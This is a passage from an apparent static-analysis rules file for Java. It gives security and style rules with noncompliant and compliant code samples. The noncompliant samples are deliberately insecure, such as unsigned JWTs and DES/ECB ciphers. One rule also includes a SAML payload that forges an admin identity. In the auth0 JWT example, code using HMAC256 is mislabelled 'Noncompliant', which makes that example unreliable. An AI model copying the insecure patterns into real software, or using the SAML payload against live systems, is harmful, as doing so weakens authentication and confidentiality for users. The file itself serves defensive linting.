            HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
            // Compliant; Use the default HostnameVerifier
            InputStream in = urlConnection.getInputStream();
            &lt;/pre&gt;
            &lt;p&gt;SimpleEmail example:&lt;/p&gt;
            &lt;pre&gt;
            Email email = new SimpleEmail();
            email.setSmtpPort(465);
            email.setAuthenticator(new DefaultAuthenticator(username, password));
            email.setSSLOnConnect(true);
            email.setSSLCheckServerIdentity(true); // Compliant
            email.send();
            &lt;/pre&gt;
            &lt;p&gt;JavaMail's example:&lt;/p&gt;
            &lt;pre&gt;
            Properties props = new Properties();
            props.put(&quot;mail.smtp.host&quot;, &quot;smtp.gmail.com&quot;);
            props.put(&quot;mail.smtp.socketFactory.port&quot;, &quot;465&quot;);
            props.put(&quot;mail.smtp.socketFactory.class&quot;, &quot;javax.net.ssl.SSLSocketFactory&quot;);
            props.put(&quot;mail.smtp.auth&quot;, &quot;true&quot;);
            props.put(&quot;mail.smtp.port&quot;, &quot;465&quot;);
            props.put(&quot;mail.smtp.ssl.checkserveridentity&quot;, true); // Compliant
            Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(&quot;username@gmail.com&quot;, &quot;password&quot;);
            }
            });
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/295.html&quot;&gt;MITRE, CWE-295&lt;/a&gt;
            - Improper Certificate Validation &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER&quot;&gt;WEAK_HOSTNAME_VERIFIER&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>ssl</tag>
        <securityStandards>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5542' priority='CRITICAL'>
        <configKey>S5542</configKey>
        <name>Encryption algorithms should be used with secure mode and padding scheme</name>
        <description>
            &lt;p&gt;Encryption operation mode and the padding scheme should be chosen appropriately to guarantee data
            confidentiality, integrity and authenticity:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; For block cipher encryption algorithms (like AES):
            &lt;ul&gt;
            &lt;li&gt; The GCM (Galois Counter Mode) mode which &lt;a href=&quot;https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis&quot;&gt;works
            internally&lt;/a&gt; with zero/no padding scheme, is recommended, as it is designed to provide both data
            authenticity (integrity) and confidentiality.
            Other similar modes are CCM, CWC, EAX, IAPM and OCB. &lt;/li&gt;
            &lt;li&gt; The CBC (Cipher Block Chaining) mode by itself provides only data confidentiality, it's
            recommended to use it along with Message
            Authentication Code or similar to achieve data authenticity (integrity) too and thus to &lt;a
            href=&quot;https://en.wikipedia.org/wiki/Padding_oracle_attack&quot;&gt;prevent padding oracle attacks&lt;/a&gt;.
            &lt;/li&gt;
            &lt;li&gt; The ECB (Electronic Codebook) mode doesn't provide serious message confidentiality: under a given
            key any given plaintext block always gets
            encrypted to the same ciphertext block. This mode should not be used. &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;li&gt; For RSA encryption algorithm, the recommended padding scheme is OAEP. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Cipher c1 = Cipher.getInstance(&quot;AES&quot;); // Noncompliant: by default ECB mode is chosen
            Cipher c2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); // Noncompliant: ECB doesn't provide serious
            message confidentiality

            Cipher c3 = Cipher.getInstance(&quot;RSA/NONE/NoPadding&quot;); // Noncompliant: RSA without OAEP padding
            scheme is not recommanded
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // Recommended for block ciphers
            Cipher c1 = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;); // Compliant

            // Recommended for RSA
            Cipher c2= Cipher.getInstance(&quot;RSA/None/OAEPWithSHA-1AndMGF1Padding&quot;); // Compliant
            Cipher c3 = Cipher.getInstance(&quot;RSA/None/OAEPWITHSHA-256ANDMGF1PADDING&quot;); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/327.html&quot;&gt;MITRE, CWE-327&lt;/a&gt;
            - Use of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/hDdGBQ&quot;&gt;CERT, MSC61-J.&lt;/a&gt; -
            Do not use insecure or weak cryptographic algorithms &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5547' priority='CRITICAL'>
        <configKey>S5547</configKey>
        <name>Cipher algorithms should be robust</name>
        <description>
            &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Strong_cryptography&quot;&gt;Strong cipher
            algorithms&lt;/a&gt; are cryptographic systems resistant to cryptanalysis, they
            are not vulnerable to well-known attacks like brute force attacks for example.&lt;/p&gt;
            &lt;p&gt;A general recommendation is to only use cipher algorithms intensively tested and promoted by the
            cryptographic community.&lt;/p&gt;
            &lt;p&gt;More specifically for block cipher, it's not recommended to use algorithm with a block size
            inferior than 128 bits.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import javax.crypto.Cipher;
            import java.security.NoSuchAlgorithmException;
            import javax.crypto.NoSuchPaddingException;

            public class test {

            public static void main(String[] args) {
            try
            {
            Cipher c1 = Cipher.getInstance(&quot;DES&quot;); // Noncompliant: DES works with 56-bit keys allow attacks
            via exhaustive search
            Cipher c7 = Cipher.getInstance(&quot;DESede&quot;); // Noncompliant: Triple DES is vulnerable to
            meet-in-the-middle attack
            Cipher c13 = Cipher.getInstance(&quot;RC2&quot;); // Noncompliant: RC2 is vulnerable to a related-key attack
            Cipher c19 = Cipher.getInstance(&quot;RC4&quot;); // Noncompliant: vulnerable to several attacks (see
            https://en.wikipedia.org/wiki/RC4#Security)
            Cipher c25 = Cipher.getInstance(&quot;Blowfish&quot;); // Noncompliant: Blowfish use a 64-bit block size
            makes it vulnerable to birthday attacks

            NullCipher nc = new NullCipher(); // Noncompliant: the NullCipher class provides an &quot;identity cipher&quot;
            one that does not transform or encrypt the plaintext in any way.
            }
            catch(NoSuchAlgorithmException|NoSuchPaddingException e)
            {
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import javax.crypto.Cipher;
            import java.security.NoSuchAlgorithmException;
            import javax.crypto.NoSuchPaddingException;

            public class test {

            public static void main(String[] args) {
            try
            {
            Cipher c31 = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;); // Compliant
            }
            catch(NoSuchAlgorithmException|NoSuchPaddingException e)
            {
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/327.html&quot;&gt;MITRE, CWE-327&lt;/a&gt;
            - Use of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/hDdGBQ&quot;&gt;CERT, MSC61-J.&lt;/a&gt; -
            Do not use insecure or weak cryptographic algorithms &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>privacy</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5659' priority='CRITICAL'>
        <configKey>S5659</configKey>
        <name>JWT should be signed and verified with strong cipher algorithms</name>
        <description>
            &lt;p&gt;If a JSON Web Token (JWT) is not signed with a strong cipher algorithm (or not signed at all) an
            attacker can forge it and impersonate user
            identities.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Don't use &lt;code&gt;none&lt;/code&gt; algorithm to sign or verify the validity of a token. &lt;/li&gt;
            &lt;li&gt; Don't use a token without verifying its signature before. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;Using &lt;a href=&quot;https://github.com/jwtk/jjwt&quot;&gt;jwtk/Java JWT&lt;/a&gt; library (to
            verify a signed token (containing a JWS) don't use the
            &lt;code&gt;parse&lt;/code&gt; method as it doesn't throw an exception if an unsigned token is provided):&lt;/p&gt;
            &lt;pre&gt;
            // Signing:
            io.jsonwebtoken.Jwts.builder() // Noncompliant, token is not signed.
            .setSubject(USER_LOGIN)
            .compact();
            // Verifying:
            io.jsonwebtoken.Jwts.parser().setSigningKey(SECRET_KEY).parse(token).getBody(); // Noncompliant
            &lt;/pre&gt;
            &lt;p&gt;Using &lt;a href=&quot;https://github.com/auth0/java-jwt&quot;&gt;auth0/Java JWT&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            // Signing:
            com.auth0.jwt.JWT.create()
            .withSubject(SUBJECT)
            .sign(Algorithm.none()); // Noncompliant, use only strong cipher algorithms when signing this JWT.
            // Verifying:
            JWTVerifier nonCompliantVerifier = com.auth0.jwt.JWT.require(Algorithm.none()) // Noncompliant
            .withSubject(LOGIN)
            .build();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Using &lt;a href=&quot;https://github.com/jwtk/jjwt&quot;&gt;Java JWT&lt;/a&gt; library (to verify
            a signed token (containing a JWS) use the &lt;code&gt;parseClaimsJws&lt;/code&gt;
            method that will throw an exception if an unsigned token is provided):&lt;/p&gt;
            &lt;pre&gt;
            // Signing:
            Jwts.builder() // Compliant
            .setSubject(USER_LOGIN)
            .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
            .compact();
            // Verifying:
            Jwts.parser().setSigningKey(SECRET_KEY).parseClaimsJws(token).getBody(); // Compliant
            &lt;/pre&gt;
            &lt;p&gt;Using &lt;a href=&quot;https://github.com/auth0/java-jwt&quot;&gt;auth0/Java JWT&lt;/a&gt; library.
            I&lt;/p&gt;
            &lt;pre&gt;
            // Signing:
            JWT.create()
            .withSubject(SUBJECT)
            .sign(Algorithm.HMAC256(SECRET_KEY)); // Noncompliant, use only strong cipher algorithms when signing this
            JWT.
            // Verifying:
            JWTVerifier nonCompliantVerifier = JWT.require(Algorithm.HMAC256(SECRET_KEY)) // Noncompliant
            .withSubject(LOGIN)
            .build();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/347.html&quot;&gt;MITRE, CWE-347&lt;/a&gt;
            - Improper Verification of Cryptographic Signature &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>privacy</tag>
        <securityStandards>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5663' priority='MINOR'>
        <configKey>S5663</configKey>
        <name>Simple string literal should be used for single line strings</name>
        <description>
            &lt;p&gt;If a string fits on a single line, without concatenation and escaped newlines, you should probably
            continue to use a string literal.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String question = &quot;&quot;&quot;
            What's the point, really?&quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String question = &quot;What's the point, really?&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/378&quot;&gt;JEP 378: Text Blocks&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html&quot;&gt;Programmer's
            Guide To Text Blocks&lt;/a&gt;, by Jim Laskey and Stuart
            Marks &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java14</tag>
    </rule>

    <rule key='S5664' priority='MAJOR'>
        <configKey>S5664</configKey>
        <name>Whitespace for text block indent should be consistent</name>
        <description>
            &lt;p&gt;Either use only spaces or only tabs for the indentation of a text block. Mixing white space will
            lead to a result with irregular indentation.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String textBlock = &quot;&quot;&quot;
            this is
            &amp;lt;tab&amp;gt;text block!
            !!!!
            &quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String textBlock = &quot;&quot;&quot;
            this is
            text block!
            !!!!
            &quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/378&quot;&gt;JEP 378: Text Blocks&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html&quot;&gt;Programmer's
            Guide To Text Blocks&lt;/a&gt;, by Jim Laskey and Stuart
            Marks &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java14</tag>
    </rule>

    <rule key='S5665' priority='MINOR'>
        <configKey>S5665</configKey>
        <name>Escape sequences should not be used in text blocks</name>
        <description>
            &lt;p&gt;The use of escape sequences is mostly unnecessary in text blocks.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;\n&lt;/code&gt; can be replaced by simply introducing the newline, &lt;code&gt;\&quot;\&quot;\&quot;&lt;/code&gt;
            it is sufficient to escape only the first qoute.&lt;/p&gt;
            &lt;pre&gt;
            String textBlock = &quot;&quot;&quot;
            \&quot;\&quot;\&quot; this \nis
            text block!
            !!!!
            &quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String textBlock = &quot;&quot;&quot;
            \&quot;&quot;&quot; this
            is
            text block!
            !!!!
            &quot;&quot;&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/378&quot;&gt;JEP 378: Text Blocks&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html&quot;&gt;Programmer's
            Guide To Text Blocks&lt;/a&gt;, by Jim Laskey and Stuart
            Marks &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java14</tag>
    </rule>

    <rule key='S5669' priority='MAJOR'>
        <configKey>S5669</configKey>
        <name>Vararg method arguments should not be confusing</name>
        <description>
            &lt;p&gt;Passing single &lt;code&gt;null&lt;/code&gt; or primitive array argument to the variable arity
            method may not work as expected. In the case of
            &lt;code&gt;null&lt;/code&gt;, it is not passed as array with single element, but the argument itself is
            &lt;code&gt;null&lt;/code&gt;. In the case of a primitive array, if
            the formal parameter is &lt;code&gt;Object...&lt;/code&gt;, it is passed as a single element array. This may
            not be obvious to someone not familiar with such
            corner cases, and it is probably better to avoid such ambiguities by explicitly casting the argument to the
            desired type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            public static void main(String[] args) {
            vararg(null); // Noncompliant, prints &quot;null&quot;
            int[] arr = {1,2,3};
            vararg(arr); // Noncompliant, prints &quot;length: 1&quot;
            }

            static void vararg(Object... s) {
            if (s == null) {
            System.out.println(&quot;null&quot;);
            } else {
            System.out.println(&quot;length: &quot; + s.length);
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class A {
            public static void main(String[] args) {
            vararg((Object) null); // prints 1
            Object[] arr = {1,2,3};
            vararg(arr); // prints 3
            }

            static void vararg(Object... s) {
            if (s == null) {
            System.out.println(&quot;null&quot;); // not reached
            } else {
            System.out.println(&quot;length: &quot; + s.length);
            }
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S5679' priority='MAJOR'>
        <configKey>S5679</configKey>
        <name>OpenSAML2 should be configured to prevent authentication bypass</name>
        <description>
            &lt;p&gt;In 2018, Duo Security found a new vulnerability class that affects SAML-based single sign-on (SSO)
            systems and this led to the following
            vulnerabilities being disclosed: &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11427&quot;&gt;CVE-2017-11427&lt;/a&gt;,
            &lt;a
            href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11428&quot;&gt;CVE-2017-11428&lt;/a&gt;,
            &lt;a
            href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11429&quot;&gt;CVE-2017-11429&lt;/a&gt;,
            &lt;a
            href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11430&quot;&gt;CVE-2017-11430&lt;/a&gt;,
            &lt;a
            href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0489&quot;&gt;CVE-2018-0489&lt;/a&gt;,
            &lt;a
            href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7340&quot;&gt;CVE-2018-7340&lt;/a&gt;.&lt;/p&gt;
            &lt;p&gt;From a specially crafted &lt;code&gt;&amp;lt;SAMLResponse&amp;gt;&lt;/code&gt; file, an attacker
            having already access to the SAML system with his own account can
            bypass the authentication mechanism and be authenticated as another user.&lt;/p&gt;
            &lt;p&gt;This is due to the fact that SAML protocol rely on XML format and how the underlying XML parser
            interprets XML comments.&lt;/p&gt;
            &lt;p&gt;If an attacker manage to change the &lt;code&gt;&amp;lt;NameID&amp;gt;&lt;/code&gt; field
            identifying the authenticated user with XML comments, he can exploit the
            vulnerability.&lt;/p&gt;
            &lt;p&gt;Here is an example of a potential payload:&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;SAMLResponse&amp;gt;
            [...]
            &amp;lt;Subject&amp;gt;
            &amp;lt;NameID&amp;gt;admin@domain.com&amp;lt;!----&amp;gt;.evil.com&amp;lt;/NameID&amp;gt;
            &amp;lt;/Subject&amp;gt;
            [...]
            &amp;lt;/SAMLResponse&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;The attacker will manage to generate a valid &amp;lt;SAMLResponse&amp;gt; content with the account
            &quot;admin@domain.com.evil.com&quot;. He will modify it with XML
            comments to finally be authenticated as &quot;admin@domain.com&quot;. To prevent this vulnerability on
            application using Spring Security SAML relying on
            OpenSAML2, XML comments should be ignored thanks to the property &lt;code&gt;ignoreComments&lt;/code&gt; set
            to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.opensaml.xml.parse.BasicParserPool;
            import org.opensaml.xml.parse.ParserPool;
            import org.opensaml.xml.parse.StaticBasicParserPool;

            public ParserPool parserPool() {
            StaticBasicParserPool staticBasicParserPool = new StaticBasicParserPool();
            staticBasicParserPool.setIgnoreComments(false); // Noncompliant: comments are not ignored during parsing
            opening the door to exploit the vulnerability
            return staticBasicParserPool;
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            public ParserPool parserPool() {
            BasicParserPool basicParserPool = new BasicParserPool();
            basicParserPool.setIgnoreComments(false); // Noncompliant
            return basicParserPool;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public ParserPool parserPool() {
            return new StaticBasicParserPool(); // Compliant: &quot;ignoreComments&quot; is set to &quot;true&quot; in
            StaticBasicParserPool constructor
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            public ParserPool parserPool() {
            return new BasicParserPool(); // Compliant: &quot;ignoreComments&quot; is set to &quot;true&quot; in
            BasicParserPool constructor
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; - Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities&quot;&gt;OWASP
            Top 10 2017 Category A9&lt;/a&gt; - Using
            Components with Known Vulnerabilities &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations&quot;&gt;Duo
            Finds SAML Vulnerabilities Affecting
            Multiple Implementations&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability&quot;&gt;Spring
            Security SAML and this week's SAML
            Vulnerability&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/spring-projects/spring-security-saml/issues/228&quot;&gt;Spring
            Security SAML: Issue #228&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a2</tag>
        <tag>owasp-a9</tag>
        <tag>spring</tag>
        <securityStandards>
            <OWASP>A2,A9</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5689' priority='MINOR'>
        <configKey>S5689</configKey>
        <name>Disclosing fingerprints from web application technologies is security-sensitive</name>
        <description>
            &lt;p&gt;Disclosing technology fingerprints allows an attacker to gather information about the technologies
            used to develop the web application and to
            perform relevant security assessments more quickly (like the identification of known vulnerable components).&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The &lt;code&gt;x-powered-by&lt;/code&gt; HTTP header or similar is used by the application. &lt;/li&gt;
            &lt;li&gt; Technologies used by the application are confidential and should not be easily guessed. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of these questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;It's recommended to not disclose technologies used on a website, with &lt;code&gt;x-powered-by&lt;/code&gt;
            HTTP header for example. &lt;/p&gt;
            &lt;p&gt;In addition, it's better to completely disable this HTTP header rather than setting it a random
            value.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public ResponseEntity&amp;lt;String&amp;gt; testResponseEntity() {
            HttpHeaders responseHeaders = new HttpHeaders();
            responseHeaders.set(&quot;x-powered-by&quot;, &quot;myproduct&quot;); // Sensitive

            return new ResponseEntity&amp;lt;String&amp;gt;(&quot;foo&quot;, responseHeaders, HttpStatus.CREATED);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Don't use &lt;code&gt;x-powered-by&lt;/code&gt; or &lt;code&gt;Server&lt;/code&gt; HTTP header or
            any other means disclosing fingerprints of the application. &lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a
            href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html&quot;&gt;OWASP
            Testing Guide - OTG-INFO-008&lt;/a&gt; - Fingerprint Web Application Framework &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/200.html&quot;&gt;MITRE, CWE-200&lt;/a&gt;
            - Information Exposure &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5693' priority='MAJOR'>
        <configKey>S5693</configKey>
        <name>Allowing requests with excessive content length is security-sensitive</name>
        <description>
            &lt;p&gt;Rejecting requests with significant content length is a good practice to control the network
            traffic intensity and thus resource consumption in
            order to prevents DoS attacks.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; size limits are not defined for the different resources of the web application. &lt;/li&gt;
            &lt;li&gt; the web application is not protected by &lt;a href=&quot;https://en.wikipedia.org/wiki/Rate_limiting&quot;&gt;rate
            limiting&lt;/a&gt; features. &lt;/li&gt;
            &lt;li&gt; the web application infrastructure has limited resources. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; For most of the features of an application, it is recommended to limit the size of requests to:
            &lt;ul&gt;
            &lt;li&gt; lower or equal to 8mb for file uploads. &lt;/li&gt;
            &lt;li&gt; lower or equal to 2mb for other requests. &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;It is recommended to customize the rule with the limit values that correspond to the web
            application.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;With default limit value of 8388608 (8MB).&lt;/p&gt;
            &lt;p&gt;A 100 MB file is allowed to be uploaded:&lt;/p&gt;
            &lt;pre&gt;
            @Bean(name = &quot;multipartResolver&quot;)
            public CommonsMultipartResolver multipartResolver() {
            CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();
            multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)
            return multipartResolver;
            }

            @Bean(name = &quot;multipartResolver&quot;)
            public CommonsMultipartResolver multipartResolver() {
            CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver(); // Sensitive, by default if
            maxUploadSize property is not defined, there is no limit and thus it's insecure
            return multipartResolver;
            }

            @Bean
            public MultipartConfigElement multipartConfigElement() {
            MultipartConfigFactory factory = new MultipartConfigFactory(); // Sensitive, no limit by default
            return factory.createMultipartConfig();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;File upload size is limited to 8 MB:&lt;/p&gt;
            &lt;pre&gt;
            @Bean(name = &quot;multipartResolver&quot;)
            public CommonsMultipartResolver multipartResolver() {
            multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)
            return multipartResolver;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html&quot;&gt;Owasp
            Cheat Sheet&lt;/a&gt; - Owasp Denial of Service
            Cheat Sheet &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/770.html&quot;&gt;CWE-770&lt;/a&gt; -
            Allocation of Resources Without Limits or Throttling &lt;/li&gt;
